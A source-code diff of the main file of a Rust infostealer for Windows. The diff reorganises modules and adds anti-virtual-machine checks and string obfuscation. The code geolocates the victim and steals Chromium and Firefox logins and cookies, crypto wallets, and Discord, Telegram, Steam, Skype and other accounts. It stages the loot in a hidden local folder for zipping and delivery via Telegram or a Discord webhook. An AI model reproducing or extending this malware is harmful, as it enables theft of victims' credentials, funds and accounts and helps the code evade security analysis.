@@ -1,15 +1,18 @@
-#![windows_subsystem = "windows"] // Hide the Console
+#![windows_subsystem = "console"] // Hide the Console
 
-mod chrome_grabber;
+mod anti_emulation;
+mod chromium;
+mod firefox;
 mod messengers;
-mod other_grabber;
-mod wallet_grabber;
-mod firefox_grabber;
+mod misc;
+mod wallets;
+
 
 extern crate serde;
 
 use screenshots::*;
 
+use hyper::{body::Buf, Client};
 use ipgeolocate::{Locator, Service};
 use std::io::{prelude::*, Seek, Write};
 use std::os::windows::fs::OpenOptionsExt;
@@ -19,8 +22,7 @@ use walkdir::{DirEntry, WalkDir};
 use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;
 use wmi::{COMLibrary, WMIConnection};
 use zip::{result::ZipError, write::FileOptions};
-use hyper::Client;
-use hyper::body::Buf;
+
 #[allow(dead_code)]
 enum DeliveryMethod {
     TELEGRAM,
@@ -37,25 +39,23 @@ const CHANNEL_ID: i64 = -0;
 const DISCORD_WEBHOOK: &str = "";
 
 const MUTEX: bool = false;
-
+const ANTI_VM: bool = true;
 static mut PASSWORDS: usize = 0;
 static mut WALLETS: usize = 0;
 static mut FILES: usize = 0;
 static mut CREDIT_CARDS: usize = 0;
 
-#[derive(serde::Deserialize,Debug)]
+#[derive(serde::Deserialize, Debug)]
 struct Data {
-	origin: String,
+    origin: String,
 }
 
-async fn getip() -> Result<String, Box<dyn std::error::Error + Send + Sync>> { 
- 
-    
-    let url = "http://httpbin.org/ip".parse().unwrap();
+async fn getip() -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
+    let url = obfstr::obfstr!("http://httpbin.org/ip").parse().unwrap();
     let res = Client::new().get(url).await.unwrap(); //  - для обработки ошибки, если не использовать match
-    
+
     let body = hyper::body::aggregate(res).await.unwrap();
-    
+
     let deserialized: Data = serde_json::from_reader(body.reader()).unwrap();
 
     Ok(deserialized.origin)
@@ -65,7 +65,7 @@ async fn getip() -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
 async fn main() {
     let app_data = std::env::var("LOCALAPPDATA").ok().unwrap();
 
-    let string_path: &str = &format!("{}\\logsxc\\", app_data);
+    let string_path: &str = &format!("{}\\logscx\\", app_data);
     let mutex_file = format!("{}\\dimp.sts", app_data);
 
     if MUTEX {
@@ -75,9 +75,28 @@ async fn main() {
         }
     }
 
- 
+    if ANTI_VM {
+        anti_emulation::detect();
+     
+    
+        let results = query_gpus();
+
+        if results.is_ok() {
+
+        for gpu in results.as_ref().unwrap() {
+            if gpu.Caption.contains("VirtualBox") || gpu.Caption.contains("VBox") || gpu.Caption.contains("VMWare") || gpu.Caption.contains("VM") {
+                std::process::exit(0);
+            }
+               
+        }
+
+        if results.as_ref().unwrap().is_empty() { // No Fucking GPU? might false trigger on RDP'S
+            std::process::exit(0);
+        }
+    }
 
 
+    }
 
     let _ = std::fs::OpenOptions::new()
         .write(true)
@@ -91,11 +110,9 @@ async fn main() {
     let mut sys = System::new_all();
     sys.refresh_all();
 
-
     let ip = getip().await.unwrap();
 
-    let city = match Locator::get(&ip, Service::IpApi).await
-    {
+    let city = match Locator::get(&ip, Service::IpApi).await {
         Ok(ip) => format!(
             "Country: {}\nCity: {}\nTimezone:{}\nCordinates:{} - {}",
             ip.country, ip.city, ip.timezone, ip.latitude, ip.longitude
@@ -120,10 +137,7 @@ async fn main() {
     ));
     sysinfo.push(format!("Language: {}", language));
     sysinfo.push(format!("Hostname: {}", whoami::hostname()));
-    sysinfo.push(format!(
-        "IP: {}",
-        ip
-    ));
+    sysinfo.push(format!("IP: {}", ip));
     sysinfo.push(city);
 
     let hardware = get_hardware();
@@ -167,37 +181,49 @@ async fn main() {
         .unwrap();
 
     //TODO Make A Method in each Package.
-    chrome_grabber::main::chrome_main(); 
-    wallet_grabber::wallets::grab_cold_wallets();
-    wallet_grabber::wallets::steal_browser_wallets();
+    chromium::main::chrome_main();
+    wallets::wallets::grab_cold_wallets();
+    wallets::wallets::steal_browser_wallets();
 
-    other_grabber::sensitive_data::grab_data();
-    other_grabber::steam::steal_steam_account();
-    other_grabber::telegram::steal_telegram();
-    other_grabber::uplay::steal_uplay();
+    misc::sensitive_data::grab_data();
+    misc::steam::steal_steam_account();
+    misc::telegram::steal_telegram();
+    misc::uplay::steal_uplay();
 
     messengers::discord::steal_discord();
     messengers::element::steal_element();
     messengers::icq::steal_icq();
     messengers::skype::steal_skype();
 
-    let ff_logins = firefox_grabber::firefox::get_all_logins().await.ok();
+    let ff_logins = firefox::firefox::get_all_logins().await.ok();
     if ff_logins.is_some() {
         let mut formatted_logins = vec![];
         for (site, login) in ff_logins.unwrap().iter() {
-            formatted_logins.push(format!("{} {}", site, format!("{}", login.iter().map(|f| f.to_string()).collect::<String>())));
+            formatted_logins.push(format!(
+                "{} {}",
+                site,
+                format!(
+                    "{}",
+                    login.iter().map(|f| f.to_string()).collect::<String>()
+                )
+            ));
         }
-        std::fs::write(format!("{}\\firefox_logins.txt", string_path), formatted_logins.join("\n")).unwrap();
+        std::fs::write(
+            format!("{}\\firefox_logins.txt", string_path),
+            formatted_logins.join("\n"),
+        )
+        .unwrap();
     }
 
-    let ff_cookies = firefox_grabber::firefox::cookie_stealer();
+    let ff_cookies = firefox::firefox::cookie_stealer();
     if ff_cookies.len() > 0 {
-        std::fs::write(format!("{}\\firefox_cookies.txt", string_path), ff_cookies.join("\n")).unwrap();
+        std::fs::write(
+            format!("{}\\firefox_cookies.txt", string_path),
+            ff_cookies.join("\n"),
+        )
+        .unwrap();
     }
 
-    
- 
-        
     unsafe {
         let mut msg_edit = vec![];
         msg_edit.push(format!(
@@ -357,17 +383,23 @@ where
     zip.finish()?;
     Result::Ok(())
 }
+#[allow(non_snake_case, non_camel_case_types)]
+#[derive(serde::Deserialize)]
+pub struct Win32_VideoController {
+    Caption: String,
+    AdapterRAM: i64,
+    VideoModeDescription: String,
+}
+#[allow(non_snake_case, non_camel_case_types)]
+#[derive(serde::Deserialize)]
+struct Win32_Processor {
+    Name: String,
+}
 
 fn get_hardware() -> Result<String, Box<dyn std::error::Error>> {
     let com_con = COMLibrary::new().unwrap();
     let wmi_con = WMIConnection::new(com_con.into()).unwrap();
-    use serde::Deserialize;
 
-    #[allow(non_snake_case, non_camel_case_types)]
-    #[derive(Deserialize)]
-    struct Win32_Processor {
-        Name: String,
-    }
 
     let mut hardware = vec![];
 
@@ -377,17 +409,12 @@ fn get_hardware() -> Result<String, Box<dyn std::error::Error>> {
         hardware.push(format!("{:#?}", cpu.Name));
     }
 
-    #[allow(non_snake_case, non_camel_case_types)]
-    #[derive(Deserialize)]
-    pub struct Win32_VideoController {
-        Caption: String,
-        AdapterRAM: i64,
-        VideoModeDescription: String,
-    }
+    
+    
+    let gpus = query_gpus();
+    if gpus.is_ok() {
 
-    let results: Vec<Win32_VideoController> = wmi_con.query()?;
-
-    for video in results {
+    for video in gpus.unwrap() {
         hardware.push(format!(
             "{} : {} bytes : {}",
             video.Caption,
@@ -395,6 +422,17 @@ fn get_hardware() -> Result<String, Box<dyn std::error::Error>> {
             video.VideoModeDescription
         ));
     }
+}
 
     return Ok(hardware.join("\n"));
+}
+
+
+pub fn query_gpus() -> Result<Vec<Win32_VideoController>, Box<dyn std::error::Error>> {
+    let com_con = COMLibrary::new()?;
+    let wmi_con = WMIConnection::new(com_con.into())?;
+    let results: Vec<Win32_VideoController> = wmi_con.query()?;
+
+    Ok(results)
+    
 }
